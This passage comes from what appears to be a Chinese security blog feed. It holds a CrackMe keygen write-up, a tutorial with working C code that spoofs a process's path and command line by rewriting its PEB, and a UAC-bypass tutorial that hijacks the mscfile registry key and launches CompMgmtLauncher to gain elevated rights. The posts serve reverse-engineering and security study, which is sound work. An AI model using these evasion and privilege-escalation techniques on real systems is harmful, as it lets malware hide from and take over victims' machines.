ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;;  转为浮点数<br><span class="hljs-number">004082</span>EF   .  D905 <span class="hljs-number">08104000</span> fld dword ptr ds:[<span class="hljs-number">0</span>x401008]              ;  １０<br><span class="hljs-number">004082</span>F5   .  <span class="hljs-number">833</span>D <span class="hljs-number">00904000</span>&gt;cmp dword ptr ds:[<span class="hljs-number">0</span>x409000],<span class="hljs-number">0</span>x0<br><span class="hljs-number">004082</span>FC   .  <span class="hljs-number">75</span> <span class="hljs-number">08</span>         jnz short AfKayAs_.<span class="hljs-number">00408306</span><br><span class="hljs-number">004082</span>FE   .  D835 <span class="hljs-number">0</span>C104000 fdiv dword ptr ds:[<span class="hljs-number">0</span>x40100C]             ;  １０／５<br><span class="hljs-symbol">00408304 </span>  .  EB <span class="hljs-number">0</span>B         jmp short AfKayAs_.<span class="hljs-number">00408311</span><br><span class="hljs-symbol">00408306 </span>  &gt;  FF35 <span class="hljs-number">0</span>C104000 push dword ptr ds:[<span class="hljs-number">0</span>x40100C]<br><span class="hljs-number">0040830</span>C   .  E8 <span class="hljs-number">578</span>DFFFF   <span class="hljs-keyword">call</span> &lt;jmp.&amp;MSVBVM50._adj_fdiv_m32&gt;<br><span class="hljs-symbol">00408311 </span>  &gt;  <span class="hljs-number">83</span>EC <span class="hljs-number">08</span>       sub esp,<span class="hljs-number">0</span>x8<br><span class="hljs-symbol">00408314 </span>  .  DFE0          fstsw ax<br><span class="hljs-symbol">00408316 </span>  .  A8 <span class="hljs-number">0</span>D         test al,<span class="hljs-number">0</span>xD<br><span class="hljs-symbol">00408318 </span>  .  <span class="hljs-number">0</span>F85 A1040000 jnz AfKayAs_.<span class="hljs-number">004087</span>BF<br><span class="hljs-number">0040831</span>E   .  DEC1          faddp st(<span class="hljs-number">1</span>),st                           ;  ＋２<br><span class="hljs-symbol">00408320 </span>  .  DFE0          fstsw ax<br><span class="hljs-symbol">00408322 </span>  .  A8 <span class="hljs-number">0</span>D         test al,<span class="hljs-number">0</span>xD<br><span class="hljs-symbol">00408324 </span>  .  <span class="hljs-number">0</span>F85 <span class="hljs-number">95040000</span> jnz AfKayAs_.<span class="hljs-number">004087</span>BF<br><span class="hljs-number">0040832</span>A   .  DD1C24        fstp qword ptr ss:[esp]<br><span class="hljs-number">0040832</span>D   .  FF15 <span class="hljs-number">48</span>B14000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;;  转回去<br></code></pre></div></td></tr></table></figure><p>第二次</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-number">004083</span>F5   .  FF15 <span class="hljs-number">74</span>B14000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaR8Str&gt;;  Msvbvm50.__vbaR8Str<br><span class="hljs-number">004083</span>FB   .  DC0D <span class="hljs-number">10104000</span> fmul qword ptr ds:[<span class="hljs-number">0</span>x401010]             ;  ＊３<br><span class="hljs-symbol">00408401 </span>  .  <span class="hljs-number">83</span>EC <span class="hljs-number">08</span>       sub esp,<span class="hljs-number">0</span>x8<br><span class="hljs-symbol">00408404 </span>  .  DC25 <span class="hljs-number">18104000</span> fsub qword ptr ds:[<span class="hljs-number">0</span>x401018]             ;  －２<br><span class="hljs-number">0040840</span>A   .  DFE0          fstsw ax<br><span class="hljs-number">0040840</span>C   .  A8 <span class="hljs-number">0</span>D         test al,<span class="hljs-number">0</span>xD<br><span class="hljs-number">0040840</span>E   .  <span class="hljs-number">0</span>F85 AB030000 jnz AfKayAs_.<span class="hljs-number">004087</span>BF<br><span class="hljs-symbol">00408414 </span>  .  DD1C24        fstp qword ptr ss:[esp]<br><span class="hljs-symbol">00408417 </span>  .  FF15 <span class="hljs-number">48</span>B14000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrR8&gt;;  Msvbvm50.__vbaStrR8<br></code></pre></div></td></tr></table></figure><p>第三次</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">004084DF</span>   .  FF<span class="hljs-number">15</span> <span class="hljs-number">74</span>B<span class="hljs-number">14000</span> call dword ptr ds:[&lt;&amp;MSVBVM<span class="hljs-number">50</span>.__vbaR<span class="hljs-number">8</span>Str&gt;;  Msvbvm<span class="hljs-number">50</span>.__vbaR<span class="hljs-number">8</span>Str<br><span class="hljs-attribute">004084E5</span>   .  DC<span class="hljs-number">25</span> <span class="hljs-number">20104000</span> fsub qword ptr ds:[<span class="hljs-number">0</span>x<span class="hljs-number">401020</span>]             ;  ＋１５<br><span class="hljs-attribute">004084EB</span>   .  <span class="hljs-number">83</span>EC <span class="hljs-number">08</span>       sub esp,<span class="hljs-number">0</span>x<span class="hljs-number">8</span><br><span class="hljs-attribute">004084EE</span>   .  DFE<span class="hljs-number">0</span>          fstsw ax<br><span class="hljs-attribute">004084F0</span>   .  A<span class="hljs-number">8</span> <span class="hljs-number">0</span>D         test al,<span class="hljs-number">0</span>xD<br><span class="hljs-attribute">004084F2</span>   .  <span class="hljs-number">0</span>F<span class="hljs-number">85</span> C<span class="hljs-number">7020000</span> jnz AfKayAs_.<span class="hljs-number">004087</span>BF<br><span class="hljs-attribute">004084F8</span>   .  DD<span class="hljs-number">1</span>C<span class="hljs-number">24</span>        fstp qword ptr ss:[esp]<br><span class="hljs-attribute">004084FB</span>   .  FF<span class="hljs-number">15</span> <span class="hljs-number">48</span>B<span class="hljs-number">14000</span> call dword ptr ds:[&lt;&amp;MSVBVM<span class="hljs-number">50</span>.__vbaStrR<span class="hljs-number">8</span>&gt;;  Msvbvm<span class="hljs-number">50</span>.__vbaStrR<span class="hljs-number">8</span><br></code></pre></div></td></tr></table></figure><p>最后的比较也是使用浮点数进行比较，用计算出结果除以我们输入，再与1进行比较。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-number">004085</span>F1   .  DCBD <span class="hljs-number">1</span>CFFFFFF fdivr qword ptr ss:[ebp-<span class="hljs-number">0</span>xE4]            ;  计算的ｓｅｒｉａｌ／输入<br><span class="hljs-number">004085</span>F7   .  EB <span class="hljs-number">11</span>         jmp short AfKayAs_.<span class="hljs-number">0040860</span>A<br><span class="hljs-number">004085</span>F9   &gt;  FFB5 <span class="hljs-number">20</span>FFFFFF push dword ptr ss:[ebp-<span class="hljs-number">0</span>xE0]<br><span class="hljs-number">004085</span>FF   .  FFB5 <span class="hljs-number">1</span>CFFFFFF push dword ptr ss:[ebp-<span class="hljs-number">0</span>xE4]<br><span class="hljs-symbol">00408605 </span>  .  E8 <span class="hljs-number">888</span>AFFFF   <span class="hljs-keyword">call</span> &lt;jmp.&amp;MSVBVM50._adj_fdivr_m64&gt;<br><span class="hljs-number">0040860</span>A   &gt;  DFE0          fstsw ax<br><span class="hljs-number">0040860</span>C   .  A8 <span class="hljs-number">0</span>D         test al,<span class="hljs-number">0</span>xD<br><span class="hljs-number">0040860</span>E   .  <span class="hljs-number">0</span>F85 AB010000 jnz AfKayAs_.<span class="hljs-number">004087</span>BF<br><span class="hljs-symbol">00408614 </span>  .  FF15 <span class="hljs-number">34</span>B14000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFpR8&gt;&gt;;  Msvbvm50.__vbaFpR8<br><span class="hljs-number">0040861</span>A   .  DC1D <span class="hljs-number">28104000</span> fcomp qword ptr ds:[<span class="hljs-number">0</span>x401028]            ;  结果与１进行比较<br><span class="hljs-symbol">00408620 </span>  .  DFE0          fstsw ax                                 ;  将寄存器的值传给ＡＸ<br><span class="hljs-symbol">00408622 </span>  .  F6C4 <span class="hljs-number">40</span>       test ah,<span class="hljs-number">0</span>x40                             ;  比较ａｈ值与０ｘ４０<br><span class="hljs-symbol">00408625 </span>  .  <span class="hljs-number">74</span> <span class="hljs-number">07</span>         je short AfKayAs_.<span class="hljs-number">0040862</span>E               ;  若不相等就会跳到清空ｅｓｉ处<br><span class="hljs-symbol">00408627 </span>  .  BE <span class="hljs-number">01000000</span>   mov esi,<span class="hljs-number">0</span>x1                              ;  相等ｅｓｉ赋值１<br><span class="hljs-number">0040862</span>C   .  EB <span class="hljs-number">02</span>         jmp short AfKayAs_.<span class="hljs-number">00408630</span><br><span class="hljs-number">0040862</span>E   &gt;  <span class="hljs-number">33</span>F6          <span class="hljs-keyword">xor</span> esi,esi                              ;  清空寄存器<br></code></pre></div></td></tr></table></figure><p>这里 fcomp是比较后改变寄存器状态，然后再由fstsw指令将寄存器值传给ax</p><table><thead><tr><th>比较结果</th><th>C3</th><th>C0</th></tr></thead><tbody><tr><td>ST(0)&gt;源操作数</td><td>0</td><td>0</td></tr><tr><td>ST(0)&lt;源操作数</td><td>0</td><td>1</td></tr><tr><td>ST(0)=源操作数</td><td>1</td><td>0</td></tr><tr><td>ST(0)不可比较</td><td>1</td><td>1</td></tr></tbody></table><p>看一下FST寄存器，看到寄存器中的值，此时是输入等于计算的时候，看到FST是4000，C3是1</p><p><img src="/2021/07/21/160CrackMe-003/3.png"></p><p>计算器转换一下看的仔细</p><p><img src="/2021/07/21/160CrackMe-003/4.png"></p><h4 id="注册机"><a href="#注册机" class="headerlink" title="注册机"></a>注册机</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入name\n&quot;</span>);<br>    <span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>    gets_s(name, <span class="hljs-number">20</span>);<br>    <span class="hljs-keyword">int</span> len = <span class="hljs-built_in">strlen</span>(name);<br>    <span class="hljs-keyword">int</span> serial;<br>    serial = len * <span class="hljs-number">0x15B38</span>;<br>    serial += name[<span class="hljs-number">0</span>];<br>    serial = (serial + <span class="hljs-number">2</span>) * <span class="hljs-number">3</span> - <span class="hljs-number">2</span> + <span class="hljs-number">15</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;serial:%d\n&quot;</span>, serial);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/07/21/160CrackMe-003/5.png"></p><p>输入正确的serial</p><p><img src="/2021/07/21/160CrackMe-003/6.png"></p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>隐藏技术-进程伪装</title>
    <link href="/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/"/>
    <url>/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<h4 id="进程伪装"><a href="#进程伪装" class="headerlink" title="进程伪装"></a>进程伪装</h4><p>进程伪装就是修改任意进程的信息，在系统中显示的是另一个进程的信息，但是实际上还是它还是在执行原来的操作。</p><h4 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h4><p>实现起来原理并不复杂，就是修改指定进程的进程环境块PEB中的进程路径以及命令行信息即可。下面使用Windbg来查看一下notepad的相关信息。</p><p>查看PEB的相关信息，可以看到ProcessParameters，这里有进程的路径和命令行相关信息。</p><p><img src="/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/1.png"></p><p>继续查看这个结构，可以看到ImagePathName和CommandLine，也可以看到其中的信息都是”C:\Windows\system32\notepad.exe”</p><p><img src="/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/2.png"></p><h4 id="编码实现"><a href="#编码实现" class="headerlink" title="编码实现"></a>编码实现</h4><ul><li>获取PEB地址</li><li>获取ProcessParameters</li><li>写入伪装信息</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// DisguiseProcess.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;winternl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;process.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* typedef_NtQueryInformationProcess)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">IN HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">IN PROCESSINFOCLASS ProcessInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">OUT PVOID ProcessInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">IN ULONG ProcessInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">OUT PULONG ReturnLength OPTIONAL</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br><span class="hljs-comment">/*PID：需要进行伪装的进程PID</span><br><span class="hljs-comment">* lpwszpath：伪装路径</span><br><span class="hljs-comment">* lpwszcmd：伪装命令行</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">BOOL <span class="hljs-title">DisguiseProcess</span><span class="hljs-params">(DWORD PID, <span class="hljs-keyword">wchar_t</span>* lpwszPath, <span class="hljs-keyword">wchar_t</span>* lpwszCmd)</span> </span>&#123;<br><span class="hljs-comment">//打开进程获取句柄</span><br>HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);<br><span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开进程失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>typedef_NtQueryInformationProcess NtQueryInformationProcess = <span class="hljs-literal">NULL</span>;<br>PROCESS_BASIC_INFORMATION pbi = &#123; <span class="hljs-number">0</span> &#125;;<br>PEB peb = &#123; <span class="hljs-number">0</span> &#125;;<br>RTL_USER_PROCESS_PARAMETERS Param = &#123; <span class="hljs-number">0</span> &#125;;<br>USHORT usCmdLen = <span class="hljs-number">0</span>;<br>USHORT usPathLen = <span class="hljs-number">0</span>;<br>NtQueryInformationProcess = (typedef_NtQueryInformationProcess)GetProcAddress(LoadLibraryA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;NtQueryInformationProcess&quot;</span>);<br><span class="hljs-keyword">if</span> (NtQueryInformationProcess == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取函数地址失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &amp;pbi, <span class="hljs-keyword">sizeof</span>(pbi), <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (!NT_SUCCESS(status)) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取进程信息失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//获取peb的地址</span><br>ReadProcessMemory(hProcess, pbi.PebBaseAddress, &amp;peb, <span class="hljs-keyword">sizeof</span>(peb), <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//获取ProcessParameters地址</span><br>ReadProcessMemory(hProcess, peb.ProcessParameters, &amp;Param, <span class="hljs-keyword">sizeof</span>(Param), <span class="hljs-literal">NULL</span>);<br>usCmdLen = <span class="hljs-number">2</span> + <span class="hljs-number">2</span> * wcslen(lpwszCmd);<br><span class="hljs-comment">//写入命令行信息</span><br>WriteProcessMemory(hProcess, Param.CommandLine.Buffer, lpwszCmd, usCmdLen, <span class="hljs-literal">NULL</span>);<br>WriteProcessMemory(hProcess, &amp;Param.CommandLine.Length, &amp;usCmdLen, <span class="hljs-keyword">sizeof</span>(usCmdLen), <span class="hljs-literal">NULL</span>);<br>usPathLen = <span class="hljs-number">2</span> + <span class="hljs-number">2</span> * wcslen(lpwszPath);<br><span class="hljs-comment">//写入路径信息</span><br>WriteProcessMemory(hProcess, Param.ImagePathName.Buffer, lpwszPath, usPathLen, <span class="hljs-literal">NULL</span>);<br>WriteProcessMemory(hProcess, &amp;Param.ImagePathName.Length, &amp;usPathLen, <span class="hljs-keyword">sizeof</span>(usPathLen), <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//伪装自身获取自身PID，如果伪装其他程序可以通过窗口或者进程名方式获得PID </span><br><span class="hljs-keyword">if</span> (DisguiseProcess(_getpid(), <span class="hljs-string">L&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>, <span class="hljs-string">L&quot;C:\\Windows\\Syetem32\\notepad.exe&quot;</span>) == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;进程伪装失败\n&quot;</span>);<br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;伪装成功\n&quot;</span>);<br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行伪装程序，提示伪装成功</p><p><img src="/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/3.png"></p><p>然后使用Process Explorer查看伪装程序的相关信息。可以看到进程已经伪装成功，描述这里写着记事本，路径和命令行都是我们写入的伪装信息。</p><p><img src="/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/4.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>隐藏技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>提权技术-Bypass UAC</title>
    <link href="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/"/>
    <url>/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/</url>
    
    <content type="html"><![CDATA[<h4 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h4><p>UAC（UserAccount Control，用户账户控制）是微软在VISTA之后的版本中引入的一种安全机制，通过UAC，应用程序和任务可以始终在非管理员账户的安全上下文中运行，除非特别授予管理员级别的系统访问权限。UAC可以阻止未经授权的应用程序自动进行安装，并防止无意地更改系统设置。</p><p>正常UAC是有一个弹窗提示，而病毒木马为了隐藏自己，就需要不通知用户的情况下“偷偷“将自己提升为管理员权限。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/1.png"></p><p>在Windows中，一些高权限的程序在运行时，是不需要弹出UAC的。这些白名单程序，默认就是以管理员权限运行。可以通过DLL劫持、注入或者是修改注册表执行命令的方式启动目标程序，实现Bypass UAC提权操作。</p><p>下面拿白名单程序CompMgmtLauncher来进行一下分析。</p><h4 id="分析CompMgmtLauncher启动过程"><a href="#分析CompMgmtLauncher启动过程" class="headerlink" title="分析CompMgmtLauncher启动过程"></a>分析CompMgmtLauncher启动过程</h4><p>打开procmon工具来监控CompMgmtLauncher启动。可以看到，它会读取HKCU\Software\Classes\mscfile\shell\open\command中的值。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/2.png"></p><p>可以看一下，此路径中存在什么，可以看到其中没有值</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/3.png"></p><p>如果该路径没有值，然后就会查询HKCR\mscfile\shell\open\command，查看其中的值，存储这mmc.exe进程的路径信息。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/4.png"></p><p>现在可以知道，当它启动时，会先查看HKCU\Software\Classes\mscfile\shell\open\command，那么如果在这里添加路径信息，CompMgmtLauncher就会启动它。</p><p>现在就修改注册表信息，在HKCU\Software\Classes\mscfile\shell\open\command添加需要提权的程序路径，再运行CompMgmtLauncher就可以完成Bypass UAC提权。</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br>    PVOID OldValue = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//关闭重定位</span><br>    <span class="hljs-built_in">Wow64DisableWow64FsRedirection</span>(&amp;OldValue);<br>    HKEY hKey = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">RegCreateKeyEx</span>(HKEY_CURRENT_USER, <span class="hljs-string">&quot;Software\\Classes\\mscfile\\Shell\\Open\\Command&quot;</span>,<br>        <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, KEY_WOW64_64KEY | KEY_ALL_ACCESS, <span class="hljs-literal">NULL</span>, &amp;hKey, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (hKey == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;创建键值失败\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-built_in">RegSetValueEx</span>(hKey, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, REG_SZ, (BYTE*)<span class="hljs-string">&quot;C:\\Users\\b1ackie\\Desktop\\TestApc.exe&quot;</span>, (<span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;C:\\Users\\b1ackie\\Desktop\\TestApc.exe&quot;</span>) + <span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">RegCloseKey</span>(hKey);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;CompMgmtLauncher.exe&quot;</span>);<br>    <span class="hljs-built_in">Wow64RevertWow64FsRedirection</span>(OldValue);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这里需要提权的程序为桌面上的TestApc.exe，运行后查看效果。运行程序可以看到，testapc.exe直接运行。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/5.png"></p><p>使用procmon工具查看权限可以看到权限是高</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/6.png"></p><p>正常启动查看权限可以看到是中。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/7.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>提权技术</tag>
      
      <tag>UAC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-002</title>
    <link href="/2021/07/20/160CrackMe-002/"/>
    <url>/2021/07/20/160CrackMe-002/</url>
    
